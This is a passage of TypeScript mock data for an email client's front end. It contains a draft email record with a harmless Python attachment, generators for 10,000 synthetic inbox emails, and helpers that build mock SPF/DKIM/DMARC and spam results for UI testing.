    },
    {
      id: 115,
      type: 0,
      status: 4,
      group_id: 0,
      is_read: true,
      dangerous: true, // Intentionally true in mock to verify draft suppresses spoof warning
      auth_status: 'not_applicable',
      error: '',
      subject: 'UI 草稿代码（带 Python 附件验证）',
      from_name: '林深',
      from_address: 'admin@pmail.dev',
      to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
      cc: [],
      reply_to: [],
      send_date: minutesAgo(3),
      size: 1620,
      msg_id: '<draft-115@pmail.dev>',
      text_format: 'plain',
      has_code: true,
      text: '一封尚未发送的代码邮件草稿，确认列表与详情均不会误报伪造警告。',
      html: '<p>一封尚未发送的代码邮件草稿，确认列表与详情均不会误报伪造警告。</p><pre><code class="language-python">def greet(name: str) -&gt; str:\n    return f"Hello, {name}!"\n</code></pre>',
      attachments: [
        {
          Filename: 'sample.py',
          ContentType: 'text/x-python',
          Index: 0,
          Size: 128,
          previewContent: 'def greet(name: str) -> str:\n    return f"Hello, {name}!"\n\nprint(greet("PMail Pro"))\n',
        },
      ],
    },
  ]
}

const SYNTHETIC_SENDERS = [
  { Name: '运维监控告警', EmailAddress: 'monitor@pmail.dev' },
  { Name: 'GitHub Actions', EmailAddress: 'actions@github.com' },
  { Name: 'Cloudflare', EmailAddress: 'noreply@notify.cloudflare.com' },
  { Name: 'Linear', EmailAddress: 'notifications@linear.app' },
  { Name: 'Figma 协作', EmailAddress: 'comments@figma.com' },
  { Name: '周书瑶', EmailAddress: 'shuyao.zhou@acme-cloud.cn' },
  { Name: '韩墨白', EmailAddress: 'mobai.han@acme-cloud.cn' },
  { Name: 'Stripe Billing', EmailAddress: 'receipts@stripe.com' },
]

const SYNTHETIC_SUBJECTS = [
  '每日巡检报告：SMTP / IMAP 队列运行正常',
  '评论提醒：你被提及在「移动端手势交互方案」中',
  'DNS 解析健康检查通过（MX / SPF / DKIM / DMARC）',
  'Issue #309 状态已更新为「待验收」',
  '依赖安全扫描完成：未发现高危漏洞',
  '月度备份校验完成：SQLite 快照已归档至对象存储',
  '新设备登录通知：macOS · Chrome 浏览器',
  '团队周会提醒：周四下午 15:00（会议室 B）',
]

export const VIRTUAL_TOTAL_INBOX = 10000

/**
 * Generates deterministic synthetic inbox records (ID >= 1000) on the fly so
 * 10,000-email virtual scrolling works instantaneously with zero startup lag.
 */
export function buildSyntheticEmail(id: number): MockEmailRecord {
  const offset = id - 1000
  const sender = SYNTHETIC_SENDERS[offset % SYNTHETIC_SENDERS.length] ?? SYNTHETIC_SENDERS[0]!
  const subjectBase = SYNTHETIC_SUBJECTS[offset % SYNTHETIC_SUBJECTS.length] ?? SYNTHETIC_SUBJECTS[0]!
  const sendDate = dayjs()
    .subtract(3 + Math.floor(offset / 8), 'day')
    .subtract((offset * 37) % 1440, 'minute')
    .format('YYYY-MM-DD HH:mm:ss')

  return {
    id,
    type: 0,
    status: 0,
    group_id: 0,
    is_read: offset % 7 !== 0,
    dangerous: false,
    error: '',
    subject: `${subjectBase} (#${offset + 1})`,
    from_name: sender.Name,
    from_address: sender.EmailAddress,
    to: [{ Name: '林深', EmailAddress: 'admin@pmail.dev' }],
    cc: [],
    reply_to: [],
    send_date: sendDate,
    size: 2400 + (offset % 15) * 320,
    msg_id: `<synthetic-${id}@pmail.dev>`,
    text: `这是第 ${offset + 1} 封用于验证万级虚拟列表 60fps 流畅滚动的归档示例邮件。系统运行稳定，所有投递指标均在正常阈值范围内。`,
    html: `<p>这是第 <strong>${offset + 1}</strong> 封用于验证万级虚拟列表 60fps 流畅滚动的归档示例邮件。</p><p>发件人：${sender.Name} &lt;${sender.EmailAddress}&gt;</p>`,
    attachments: [],
  }
}

export function resolveMockAuthStatus(rec: MockEmailRecord): MailAuthStatus {
  if (rec.auth_status) return rec.auth_status
  if (rec.status === 4 || rec.status === 1 || rec.type === 1) return 'not_applicable'
  return rec.dangerous ? 'fail' : 'pass'
}

export function toEmailDetail(rec: MockEmailRecord): EmailDetail {
  const iso = dayjs(rec.send_date).isValid()
    ? dayjs(rec.send_date).toISOString()
    : new Date().toISOString()
  const isDraftOrSent = rec.status === 4 || rec.status === 1 || rec.type === 1
  return {
    id: rec.id,
    type: rec.type,
    subject: rec.subject,
    reply_to: JSON.stringify(rec.reply_to),
    from_name: rec.from_name,
    from_address: rec.from_address,
    to: JSON.stringify(rec.to),
    bcc: '[]',
    cc: JSON.stringify(rec.cc),
    to_list: rec.to.map((x) => ({ name: x.Name, address: x.EmailAddress })),
    cc_list: rec.cc.map((x) => ({ name: x.Name, address: x.EmailAddress })),
    bcc_list: [],
    reply_to_list: rec.reply_to.map((x) => ({ name: x.Name, address: x.EmailAddress })),
    text: rec.text,
    html: rec.html,
    sender: JSON.stringify({ Name: rec.from_name, EmailAddress: rec.from_address }),
    attachments: rec.attachments.map(({ Filename, ContentType, Index, Size }) => ({
      Filename,
      ContentType,
      Index,
      Size,
    })),
    attachments_list: rec.attachments.map((att) => ({
      index: att.Index,
      filename: att.Filename,
      content_type: att.ContentType,
      size: att.Size,
      inline: false,
      previewable: Boolean(att.previewContent),
    })),
    spf_check: rec.dangerous || isDraftOrSent ? 0 : 1,
    dkim_check: rec.dangerous || isDraftOrSent ? 0 : 1,
    auth_status: resolveMockAuthStatus(rec),
    auth_results: isDraftOrSent
      ? null
      : rec.dangerous
        ? {
            spf: {
              result: 'fail',
              reason: 'mail_from_no_match',
              domain: rec.from_address.split('@')[1] || 'unknown.example',
              aligned: false,
            },
            dkim: {
              result: 'fail',
              reason: 'signature_invalid',
              domain: rec.from_address.split('@')[1] || 'unknown.example',
              aligned: false,
            },
            dmarc: {
              result: 'fail',
              reason: 'no_aligned_pass',
              domain: rec.from_address.split('@')[1] || 'unknown.example',
              aligned: false,
              policy: 'quarantine',
            },
            trusted_relay: false,
          }
        : {
            spf: {
              result: 'pass',
              reason: 'mail_from_matched_ip4',
              domain: rec.from_address.split('@')[1] || 'pmail.dev',
              aligned: true,
            },
            dkim: {
              result: 'pass',
              reason: 'aligned_signature',
              domain: rec.from_address.split('@')[1] || 'pmail.dev',
              aligned: true,
            },
            dmarc: {
              result: 'pass',
              reason: 'aligned_spf_or_dkim',
              domain: rec.from_address.split('@')[1] || 'pmail.dev',
              aligned: true,
              policy: 'reject',
            },
            trusted_relay: false,
          },
    spam:
      rec.spam !== undefined
        ? rec.spam
        : rec.status === 5
          ? {
              score: 11.5,
              verdict: 'spam',
              reasons: [
                { code: 'auth_dmarc_fail', weight: 3.5 },
                { code: 'dnsbl_listed', weight: 4.5, detail: 'zen.spamhaus.org' },
                { code: 'bayes_spam', weight: 3.5 },
              ],
            }
          : null,
    risk: rec.risk ?? { level: 'none', findings: [] },
    verification_code: rec.verification_code ?? null,
    status: rec.status,
    send_time: rec.send_date,
    send_time_iso: iso,
    send_date: rec.send_date,
    send_date_iso: iso,
    update_time: rec.send_date,
    update_time_iso: iso,
    create_time: rec.send_date,
    create_time_iso: iso,
    size: rec.size,
    error: rec.error,
    msg_id: rec.msg_id,
    is_read: rec.is_read ? 1 : 0,
    is_starred: Boolean(rec.is_starred),
    text_format: rec.text_format ?? 'plain',
    has_code:
      rec.has_code ??
      (rec.html.includes('<pre>') || rec.html.includes('<code>') || rec.text.includes('```')),
  }
}
